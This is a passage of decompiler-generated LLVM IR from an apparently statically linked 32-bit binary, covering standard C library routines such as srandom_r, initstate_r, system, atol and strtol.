  store i32 %v0_804cf6e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cf78

dec_label_pc_804cf72:                             ; preds = %dec_label_pc_804cf51
  %v1_804cf72 = load i32, i32* %edi.global-to-local, align 4
  %v7_804cf72 = icmp ult i32 %v1_804cf69, %v1_804cf72
  br i1 %v7_804cf72, label %dec_label_pc_804cf78, label %dec_label_pc_804cf76

dec_label_pc_804cf76:                             ; preds = %dec_label_pc_804cf72
  %v0_804cf76 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804cf76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cf78

dec_label_pc_804cf78:                             ; preds = %dec_label_pc_804cf72, %dec_label_pc_804cf6e, %dec_label_pc_804cf76
  %v0_804cf78 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf78 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf78 = inttoptr i32 %v1_804cf78 to i32*
  store i32 %v0_804cf78, i32* %v2_804cf78, align 4
  %v0_804cf7a = load i32, i32* %eax.global-to-local, align 4
  %v1_804cf7a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf7a = add i32 %v1_804cf7a, 4
  %v3_804cf7a = inttoptr i32 %v2_804cf7a to i32*
  store i32 %v0_804cf7a, i32* %v3_804cf7a, align 4
  br label %dec_label_pc_804cf7d

dec_label_pc_804cf7d:                             ; preds = %dec_label_pc_804cf3a, %dec_label_pc_804cf78
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804cf7f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cf7f, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804cf45, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804cf7d, { 1, 0 }
  uselistorder label %dec_label_pc_804cf78, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804cf84 = load i32, i32* @ebp, align 4
  %v0_804cf85 = load i32, i32* @edi, align 4
  %v0_804cf86 = load i32, i32* @esi, align 4
  %v0_804cf87 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_804cf92 = trunc i64 %arg1 to i32
  store i32 %v4_804cf92, i32* %eax.global-to-local, align 4
  %v1_804cf96 = add i32 %arg2, 12
  %v2_804cf96 = inttoptr i32 %v1_804cf96 to i32*
  %v3_804cf96 = load i32, i32* %v2_804cf96, align 4
  store i32 %v3_804cf96, i32* %edx.global-to-local, align 4
  %v6_804cf9c = icmp ugt i32 %v3_804cf96, 4
  br i1 %v6_804cf9c, label %dec_label_pc_804d010, label %dec_label_pc_804cf9e

dec_label_pc_804cf9e:                             ; preds = %entry
  %v1_804cf9e = add i32 %arg2, 8
  %v2_804cf9e = inttoptr i32 %v1_804cf9e to i32*
  %v3_804cf9e = load i32, i32* %v2_804cf9e, align 4
  store i32 %v3_804cf9e, i32* %ebx.global-to-local, align 4
  %v1_804cfa1 = icmp eq i32 %v4_804cf92, 0
  %v1_804cfa3 = icmp eq i1 %v1_804cfa1, false
  br i1 %v1_804cfa3, label %dec_label_pc_804cfa7, label %dec_label_pc_804cfa5

dec_label_pc_804cfa5:                             ; preds = %dec_label_pc_804cf9e
  %v1_804cfa5 = and i32 %v4_804cf92, -256
  %v2_804cfa5 = or i32 %v1_804cfa5, 1
  store i32 %v2_804cfa5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cfa7

dec_label_pc_804cfa7:                             ; preds = %dec_label_pc_804cf9e, %dec_label_pc_804cfa5
  %v0_804cfa7 = phi i32 [ %v4_804cf92, %dec_label_pc_804cf9e ], [ %v2_804cfa5, %dec_label_pc_804cfa5 ]
  %v2_804cfa7 = inttoptr i32 %v3_804cf9e to i32*
  store i32 %v0_804cfa7, i32* %v2_804cfa7, align 4
  %v1_804cfa9 = icmp eq i32 %v3_804cf96, 0
  br i1 %v1_804cfa9, label %dec_label_pc_804d00e, label %dec_label_pc_804cfad

dec_label_pc_804cfad:                             ; preds = %dec_label_pc_804cfa7
  %v0_804cfad = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804cfad, i32* %edx.global-to-local, align 4
  %v0_804cfaf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804cfaf, i32* %ecx.global-to-local, align 4
  %v0_804cfb1 = load i32, i32* @esi, align 4
  %v1_804cfb1 = add i32 %v0_804cfb1, 16
  %v2_804cfb1 = inttoptr i32 %v1_804cfb1 to i32*
  %v3_804cfb1 = load i32, i32* %v2_804cfb1, align 4
  store i32 %v3_804cfb1, i32* %eax.global-to-local, align 4
  %v4_804cfb9 = sext i32 %v3_804cfb1 to i64
  store i64 %v4_804cfb9, i64* %stack_var_-40, align 8
  %v5_804cfeb27 = icmp sgt i32 %v3_804cfb1, 1
  br i1 %v5_804cfeb27, label %dec_label_pc_804cfbe, label %dec_label_pc_804cfed

dec_label_pc_804cfbe:                             ; preds = %dec_label_pc_804cfad, %dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge
  %v0_804cfe2 = phi i32 [ %v0_804cfe2.pre, %dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge ], [ %v0_804cfaf, %dec_label_pc_804cfad ]
  %v0_804cfbe = phi i32 [ %v0_804cfbe.pre, %dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge ], [ %v0_804cfad, %dec_label_pc_804cfad ]
  %v0_804cfe528 = phi i32 [ %v0_804cfe8.pre, %dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge ], [ 1, %dec_label_pc_804cfad ]
  %v1_804cfc5 = ashr i32 %v0_804cfbe, 31
  %v2_804cfc6 = zext i32 %v0_804cfbe to i64
  %v4_804cfc6 = zext i32 %v1_804cfc5 to i64
  %v5_804cfc6 = mul nuw i64 %v4_804cfc6, 4294967296
  %v6_804cfc6 = or i64 %v5_804cfc6, %v2_804cfc6
  %v8_804cfc6 = sdiv i64 %v6_804cfc6, 127773
  %v9_804cfc6 = trunc i64 %v8_804cfc6 to i32
  %v10_804cfc6 = srem i64 %v6_804cfc6, 127773
  %v3_804cfcc = mul nsw i64 %v10_804cfc6, 16807
  %v4_804cfcc = trunc i64 %v3_804cfcc to i32
  %v3_804cfd2 = mul i32 %v9_804cfc6, 2836
  store i32 %v3_804cfd2, i32* %eax.global-to-local, align 4
  %v2_804cfd8 = sub i32 %v4_804cfcc, %v3_804cfd2
  %v13_804cfd8 = icmp slt i32 %v2_804cfd8, 0
  %v1_804cfda = icmp eq i1 %v13_804cfd8, false
  %v1_804cfdc = add i32 %v2_804cfd8, 2147483647
  %v2_804cfd8.v1_804cfdc = select i1 %v1_804cfda, i32 %v2_804cfd8, i32 %v1_804cfdc
  store i32 %v2_804cfd8.v1_804cfdc, i32* %edx.global-to-local, align 4
  %v1_804cfe2 = add i32 %v0_804cfe2, 4
  store i32 %v1_804cfe2, i32* %ecx.global-to-local, align 4
  %v1_804cfe5 = add i32 %v0_804cfe528, 1
  store i32 %v1_804cfe5, i32* @edi, align 4
  %v2_804cfe6 = inttoptr i32 %v1_804cfe2 to i32*
  store i32 %v2_804cfd8.v1_804cfdc, i32* %v2_804cfe6, align 4
  %v0_804cfe8.pre = load i32, i32* @edi, align 4
  %v3_804cfe8.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_804cfe8.pre to i32
  %v5_804cfeb = icmp slt i32 %v0_804cfe8.pre, %extract.t12
  br i1 %v5_804cfeb, label %dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge, label %dec_label_pc_804cfe8.dec_label_pc_804cfed_crit_edge

dec_label_pc_804cfbe.dec_label_pc_804cfbe_crit_edge: ; preds = %dec_label_pc_804cfbe
  %v0_804cfbe.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804cfe2.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804cfbe

dec_label_pc_804cfe8.dec_label_pc_804cfed_crit_edge: ; preds = %dec_label_pc_804cfbe
  %v0_804cfed.pre = load i32, i32* @esi, align 4
  %v0_804cff0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cfed

dec_label_pc_804cfed:                             ; preds = %dec_label_pc_804cfe8.dec_label_pc_804cfed_crit_edge, %dec_label_pc_804cfad
  %v0_804cff0 = phi i32 [ %v0_804cff0.pre, %dec_label_pc_804cfe8.dec_label_pc_804cfed_crit_edge ], [ %v0_804cfaf, %dec_label_pc_804cfad ]
  %v0_804cfed = phi i32 [ %v0_804cfed.pre, %dec_label_pc_804cfe8.dec_label_pc_804cfed_crit_edge ], [ %v0_804cfb1, %dec_label_pc_804cfad ]
  %v1_804cfed = add i32 %v0_804cfed, 20
  %v2_804cfed = inttoptr i32 %v1_804cfed to i32*
  %v3_804cfed = load i32, i32* %v2_804cfed, align 4
  store i32 %v3_804cfed, i32* %eax.global-to-local, align 4
  %v2_804cff0 = add i32 %v0_804cfed, 4
  %v3_804cff0 = inttoptr i32 %v2_804cff0 to i32*
  store i32 %v0_804cff0, i32* %v3_804cff0, align 4
  %v0_804cff3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cff3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cff3 = mul i32 %v1_804cff3, 4
  %v3_804cff3 = add i32 %v2_804cff3, %v0_804cff3
  store i32 %v3_804cff3, i32* %eax.global-to-local, align 4
  %v1_804cff6 = load i32, i32* @esi, align 4
  %v2_804cff6 = inttoptr i32 %v1_804cff6 to i32*
  store i32 %v3_804cff3, i32* %v2_804cff6, align 4
  %v3_804cff8 = load i64, i64* %stack_var_-40, align 8
  %v6_804cff8 = mul nsw i64 %v3_804cff8, 10
  %v7_804cff8 = trunc i64 %v6_804cff8 to i32
  %v2_804cffe = ptrtoint i32* %stack_var_-20 to i32
  %v1_804d00b24 = add i32 %v7_804cff8, -1
  %v9_804d00b25 = icmp slt i32 %v1_804d00b24, 0
  store i32 %v1_804d00b24, i32* @ebx, align 4
  %v1_804d00c26 = icmp eq i1 %v9_804d00b25, false
  br i1 %v1_804d00c26, label %dec_label_pc_804cffe, label %dec_label_pc_804d00e

dec_label_pc_804cffe:                             ; preds = %dec_label_pc_804cfed, %dec_label_pc_804cffe
  store i32 %v2_804cffe, i32* %eax.global-to-local, align 4
  %v0_804d003 = load i32, i32* @esi, align 4
  %v2_804d004 = inttoptr i32 %v0_804d003 to i32*
  %v3_804d004 = call i32 @__GI_random_r(i32* %v2_804d004, i32 %v2_804cffe)
  store i32 %v0_804d003, i32* %eax.global-to-local, align 4
  store i32 %v2_804cffe, i32* %edx.global-to-local, align 4
  %v0_804d00b.pre = load i32, i32* @ebx, align 4
  %v1_804d00b = add i32 %v0_804d00b.pre, -1
  %v9_804d00b = icmp slt i32 %v1_804d00b, 0
  store i32 %v1_804d00b, i32* @ebx, align 4
  %v1_804d00c = icmp eq i1 %v9_804d00b, false
  br i1 %v1_804d00c, label %dec_label_pc_804cffe, label %dec_label_pc_804d00e

dec_label_pc_804d00e:                             ; preds = %dec_label_pc_804cfed, %dec_label_pc_804cffe, %dec_label_pc_804cfa7
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d010

dec_label_pc_804d010:                             ; preds = %entry, %dec_label_pc_804d00e
  %v0_804d013 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804d00e ]
  store i32 %v0_804d013, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf87, i32* @ebx, align 4
  store i32 %v0_804cf86, i32* @esi, align 4
  store i32 %v0_804cf85, i32* @edi, align 4
  store i32 %v0_804cf84, i32* @ebp, align 4
  ret i32 %v0_804d013

; uselistorder directives
  uselistorder i32 %v0_804d013, { 1, 0 }
  uselistorder i32 %v1_804d00b, { 1, 0 }
  uselistorder i32 %v0_804cfed, { 1, 0 }
  uselistorder i32 %v0_804cfe8.pre, { 1, 0 }
  uselistorder i32 %v2_804cfd8.v1_804cfdc, { 1, 0 }
  uselistorder i32 %v0_804cfbe, { 1, 0 }
  uselistorder i32 %v0_804cfaf, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d010, { 1, 0 }
  uselistorder label %dec_label_pc_804d00e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cffe, { 1, 0 }
  uselistorder label %dec_label_pc_804cfbe, { 1, 0 }
  uselistorder label %dec_label_pc_804cfa7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804d01d = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_804d03e, label %dec_label_pc_804d032

dec_label_pc_804d032:                             ; preds = %entry
  %v2_804d032 = icmp ult i32 %arg3, 256
  %v1_804d039 = select i1 %v2_804d032, i32 5, i32 4
  store i32 %v1_804d039, i32* @ebx, align 4
  br label %dec_label_pc_804d054

dec_label_pc_804d03e:                             ; preds = %entry
  %v6_804d041 = icmp ugt i32 %arg3, 31
  br i1 %v6_804d041, label %dec_label_pc_804d04c, label %dec_label_pc_804d043

dec_label_pc_804d043:                             ; preds = %dec_label_pc_804d03e
  store i32 0, i32* @ebx, align 4
  %v6_804d048 = icmp ugt i32 %arg3, 7
  br i1 %v6_804d048, label %dec_label_pc_804d054, label %dec_label_pc_804d0a4

dec_label_pc_804d04c:                             ; preds = %dec_label_pc_804d03e
  %v2_804d04c = icmp ult i32 %arg3, 64
  %v1_804d051 = select i1 %v2_804d04c, i32 3, i32 2
  store i32 %v1_804d051, i32* @ebx, align 4
  br label %dec_label_pc_804d054

dec_label_pc_804d054:                             ; preds = %dec_label_pc_804d043, %dec_label_pc_804d032, %dec_label_pc_804d04c
  %v0_804d054 = phi i32 [ 0, %dec_label_pc_804d043 ], [ %v1_804d039, %dec_label_pc_804d032 ], [ %v1_804d051, %dec_label_pc_804d04c ]
  %v1_804d054 = mul nuw nsw i32 %v0_804d054, 4
  %v2_804d054 = add i32 %v1_804d054, ptrtoint (i32* @global_var_80521f4.369 to i32)
  %v3_804d054 = inttoptr i32 %v2_804d054 to i32*
  %v4_804d054 = load i32, i32* %v3_804d054, align 4
  store i32 %v4_804d054, i32* %eax.global-to-local, align 4
  %v1_804d05b = add i32 %tmp7, 4
  store i32 %v1_804d05b, i32* @esi, align 4
  %v2_804d05e = add i32 %arg4, 16
  %v3_804d05e = inttoptr i32 %v2_804d05e to i32*
  store i32 %v4_804d054, i32* %v3_804d05e, align 4
  %v0_804d061 = load i32, i32* @ebx, align 4
  %v1_804d061 = mul i32 %v0_804d061, 4
  %v2_804d061 = add i32 %v1_804d061, ptrtoint (i32* @global_var_80521e0.370 to i32)
  %v3_804d061 = inttoptr i32 %v2_804d061 to i32*
  %v4_804d061 = load i32, i32* %v3_804d061, align 4
  store i32 %v4_804d061, i32* %edx.global-to-local, align 4
  %v0_804d068 = load i32, i32* @esi, align 4
  %v1_804d068 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d068 = mul i32 %v1_804d068, 4
  %v3_804d068 = add i32 %v2_804d068, %v0_804d068
  store i32 %v3_804d068, i32* %eax.global-to-local, align 4
  %v1_804d06b = load i32, i32* @edi, align 4
  %v2_804d06b = add i32 %v1_804d06b, 12
  %v3_804d06b = inttoptr i32 %v2_804d06b to i32*
  store i32 %v0_804d061, i32* %v3_804d06b, align 4
  %v0_804d06e = load i32, i32* %edx.global-to-local, align 4
  %v1_804d06e = load i32, i32* @edi, align 4
  %v2_804d06e = add i32 %v1_804d06e, 20
  %v3_804d06e = inttoptr i32 %v2_804d06e to i32*
  store i32 %v0_804d06e, i32* %v3_804d06e, align 4
  %v0_804d071 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d071 = load i32, i32* @edi, align 4
  %v2_804d071 = add i32 %v1_804d071, 24
  %v3_804d071 = inttoptr i32 %v2_804d071 to i32*
  store i32 %v0_804d071, i32* %v3_804d071, align 4
  %v0_804d074 = load i32, i32* @esi, align 4
  %v1_804d074 = load i32, i32* @edi, align 4
  %v2_804d074 = add i32 %v1_804d074, 8
  %v3_804d074 = inttoptr i32 %v2_804d074 to i32*
  store i32 %v0_804d074, i32* %v3_804d074, align 4
  %v0_804d077 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804d07c = sext i32 %arg1 to i64
  %v3_804d07c = call i32 @srandom_r(i64 %v2_804d07c, i32 %v0_804d077)
  %v0_804d081 = load i32, i32* @ebp, align 4
  %v1_804d081 = inttoptr i32 %v0_804d081 to i32*
  store i32 0, i32* %v1_804d081, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d08c = load i32, i32* @ebx, align 4
  %v1_804d08c = icmp eq i32 %v0_804d08c, 0
  br i1 %v1_804d08c, label %dec_label_pc_804d0bd, label %dec_label_pc_804d090

dec_label_pc_804d090:                             ; preds = %dec_label_pc_804d054
  %v0_804d090 = load i32, i32* @edi, align 4
  %v1_804d090 = add i32 %v0_804d090, 4
  %v2_804d090 = inttoptr i32 %v1_804d090 to i32*
  %v3_804d090 = load i32, i32* %v2_804d090, align 4
  %v1_804d093 = load i32, i32* @esi, align 4
  %v2_804d093 = sub i32 %v3_804d090, %v1_804d093
  %v2_804d095 = sdiv i32 %v2_804d093, 4
  %v3_804d098 = mul i32 %v2_804d095, 5
  %v2_804d09b = add i32 %v3_804d098, %v0_804d08c
  %v1_804d09d = load i32, i32* @ebp, align 4
  %v2_804d09d = inttoptr i32 %v1_804d09d to i32*
  store i32 %v2_804d09b, i32* %v2_804d09d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0bd

dec_label_pc_804d0a4:                             ; preds = %dec_label_pc_804d043
  %v1_804d0a4 = call i32 @__errno_location(i32 %v0_804d01d)
  store i32 %v1_804d0a4, i32* %eax.global-to-local, align 4
  %v1_804d0a9 = inttoptr i32 %v1_804d0a4 to i32*
  store i32 22, i32* %v1_804d0a9, align 4
  %v0_804d0af = load i32, i32* %stack_var_-36, align 4
  %v1_804d0af = call i32 @__errno_location(i32 %v0_804d0af)
  %v1_804d0b4 = inttoptr i32 %v1_804d0af to i32*
  store i32 22, i32* %v1_804d0b4, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0bd

dec_label_pc_804d0bd:                             ; preds = %dec_label_pc_804d054, %dec_label_pc_804d090, %dec_label_pc_804d0a4
  %v0_804d0c4 = phi i32 [ 0, %dec_label_pc_804d054 ], [ 0, %dec_label_pc_804d090 ], [ -1, %dec_label_pc_804d0a4 ]
  ret i32 %v0_804d0c4

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d0bd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d054, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804d0c8 = load i32, i32* @ebx, align 4
  %v4_804d0d1 = icmp eq i32 %arg1, 0
  br i1 %v4_804d0d1, label %dec_label_pc_804d1f4, label %dec_label_pc_804d0dc

dec_label_pc_804d0dc:                             ; preds = %entry
  %v2_804d0e2 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_804d0f1 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_804d100 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_804d109 = call i32 @__vfork(i32 %v2_804d100)
  store i32 %v1_804d109, i32* @ebx, align 4
  %v2_804d113 = icmp slt i32 %v1_804d109, 0
  %v2_804d116 = icmp eq i1 %v2_804d113, false
  br i1 %v2_804d116, label %dec_label_pc_804d147, label %dec_label_pc_804d118

dec_label_pc_804d118:                             ; preds = %dec_label_pc_804d0dc
  %v2_804d120 = call i32 @__bsd_signal(i32 3, i32 %v2_804d0e2)
  store i32 %v2_804d0e2, i32* @edx, align 4
  %v2_804d12d = call i32 @__bsd_signal(i32 2, i32 %v2_804d0f1)
  store i32 2, i32* @ebx, align 4
  %v2_804d13a = call i32 @__bsd_signal(i32 17, i32 %v2_804d100)
  br label %dec_label_pc_804d1f1

dec_label_pc_804d147:                             ; preds = %dec_label_pc_804d0dc
  %v1_804d113 = icmp eq i32 %v1_804d109, 0
  %v1_804d147 = icmp eq i1 %v1_804d113, false
  br i1 %v1_804d147, label %dec_label_pc_804d193, label %dec_label_pc_804d149

dec_label_pc_804d149:                             ; preds = %dec_label_pc_804d147
  %v2_804d14f = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_804d15a = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_804d165 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_804d184 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805220b.373 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052210.372 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052208.371 to i32), i32 %arg1, i32 0)
  %v1_804d18e = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804d193:                             ; preds = %dec_label_pc_804d147
  %v2_804d199 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_804d1a4 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_804d1a9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_804d1b2 = load i32, i32* @ebx, align 4
  %v7_804d1b3 = call i32 @wait4(i32 %v0_804d1b2, i32 %v2_804d1a9, i32 0, i32 0)
  %v8_804d1bb = icmp eq i32 %v7_804d1b3, -1
  %v1_804d1bc = icmp eq i1 %v8_804d1bb, false
  br i1 %v1_804d1bc, label %dec_label_pc_804d1c6, label %dec_label_pc_804d1be

dec_label_pc_804d1be:                             ; preds = %dec_label_pc_804d193
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d1c6

dec_label_pc_804d1c6:                             ; preds = %dec_label_pc_804d193, %dec_label_pc_804d1be
  %v2_804d1ce = call i32 @__bsd_signal(i32 3, i32 %v2_804d0e2)
  store i32 %v2_804d0e2, i32* @ebx, align 4
  %v2_804d1db = call i32 @__bsd_signal(i32 2, i32 %v2_804d0f1)
  store i32 %v2_804d0f1, i32* @edx, align 4
  %v2_804d1e8 = call i32 @__bsd_signal(i32 17, i32 %v2_804d100)
  %v3_804d1ed = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d1f1

dec_label_pc_804d1f1:                             ; preds = %dec_label_pc_804d118, %dec_label_pc_804d1c6
  %storemerge = phi i32 [ -1, %dec_label_pc_804d118 ], [ %v3_804d1ed, %dec_label_pc_804d1c6 ]
  br label %dec_label_pc_804d1f4

dec_label_pc_804d1f4:                             ; preds = %entry, %dec_label_pc_804d1f1
  %v0_804d1f8 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_804d1f1 ]
  store i32 %v0_804d0c8, i32* @ebx, align 4
  ret i32 %v0_804d1f8

; uselistorder directives
  uselistorder i32 %v1_804d109, { 1, 2, 0 }
  uselistorder i32 %v2_804d100, { 1, 0, 2 }
  uselistorder i32 %v2_804d0f1, { 0, 2, 1 }
  uselistorder i32 %v2_804d0e2, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d1f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d1f1, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c6, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804d207 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804d207
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804d221 = inttoptr i32 %arg1 to i8*
  %v5_804d221 = call i32 @_stdlib_strto_l(i8* %v4_804d221, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804d221
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804d22f = load i32, i32* @ebx, align 4
  store i32 %v0_804d22f, i32* %stack_var_-16, align 4
  %v0_804d233 = load i32, i32* @global_var_8054320, align 32
  %v4_804d239 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d239, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_804d239, i32* %ebx.global-to-local, align 4
  %v2_804d24641 = load i8, i8* %arg1, align 1
  %v3_804d24642 = sext i8 %v2_804d24641 to i32
  store i32 %v3_804d24642, i32* %eax.global-to-local, align 4
  %v2_804d24943 = mul nsw i32 %v3_804d24642, 2
  %v3_804d24944 = add i32 %v2_804d24943, %v0_804d233
  %v4_804d24945 = inttoptr i32 %v3_804d24944 to i8*
  %v5_804d24946 = load i8, i8* %v4_804d24945, align 1
  %v6_804d24947 = and i8 %v5_804d24946, 32
  %v7_804d24948 = icmp eq i8 %v6_804d24947, 0
  %v1_804d24d49 = icmp eq i1 %v7_804d24948, false
  br i1 %v1_804d24d49, label %dec_label_pc_804d245, label %dec_label_pc_804d24f

dec_label_pc_804d245:                             ; preds = %entry, %dec_label_pc_804d245
  %v0_804d24550 = phi i32 [ %v1_804d245, %dec_label_pc_804d245 ], [ %v4_804d239, %entry ]
  %v1_804d245 = add i32 %v0_804d24550, 1
  store i32 %v1_804d245, i32* %ebx.global-to-local, align 4
  %v1_804d246 = inttoptr i32 %v1_804d245 to i8*
  %v2_804d246 = load i8, i8* %v1_804d246, align 1
  %v3_804d246 = sext i8 %v2_804d246 to i32
  store i32 %v3_804d246, i32* %eax.global-to-local, align 4
  %v2_804d249 = mul nsw i32 %v3_804d246, 2
  %v3_804d249 = add i32 %v2_804d249, %v0_804d233
  %v4_804d249 = inttoptr i32 %v3_804d249 to i8*
  %v5_804d249 = load i8, i8* %v4_804d249, align 1
  %v6_804d249 = and i8 %v5_804d249, 32
  %v7_804d249 = icmp eq i8 %v6_804d249, 0
  %v1_804d24d = icmp eq i1 %v7_804d249, false
  br i1 %v1_804d24d, label %dec_label_pc_804d245, label %dec_label_pc_804d24f

dec_label_pc_804d24f:                             ; preds = %dec_label_pc_804d245, %entry
  %v0_804d245.lcssa = phi i32 [ %v4_804d239, %entry ], [ %v1_804d245, %dec_label_pc_804d245 ]
  %v2_804d246.lcssa = phi i8 [ %v2_804d24641, %entry ], [ %v2_804d246, %dec_label_pc_804d245 ]
  %v3_804d246.lcssa = phi i32 [ %v3_804d24642, %entry ], [ %v3_804d246, %dec_label_pc_804d245 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804d24f = icmp eq i8 %v2_804d246.lcssa, 43
  br i1 %v9_804d24f, label %dec_label_pc_804d264, label %dec_label_pc_804d254

dec_label_pc_804d254:                             ; preds = %dec_label_pc_804d24f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_804d256 = icmp eq i8 %v2_804d246.lcssa, 45
  %v1_804d259 = icmp eq i1 %v9_804d256, false
  br i1 %v1_804d259, label %dec_label_pc_804d265, label %dec_label_pc_804d264

dec_label_pc_804d264:                             ; preds = %dec_label_pc_804d24f, %dec_label_pc_804d254
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804d254 ], [ 0, %dec_label_pc_804d24f ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_804d264 = add i32 %v0_804d245.lcssa, 1
  store i32 %v1_804d264, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d265

dec_label_pc_804d265:                             ; preds = %dec_label_pc_804d254, %dec_label_pc_804d264
  %v0_804d277 = phi i32 [ %v0_804d245.lcssa, %dec_label_pc_804d254 ], [ %v1_804d264, %dec_label_pc_804d264 ]
  %v1_804d267 = and i32 %arg3, -17
  %v2_804d267 = icmp eq i32 %v1_804d267, 0
  %v1_804d26d = icmp eq i1 %v2_804d267, false
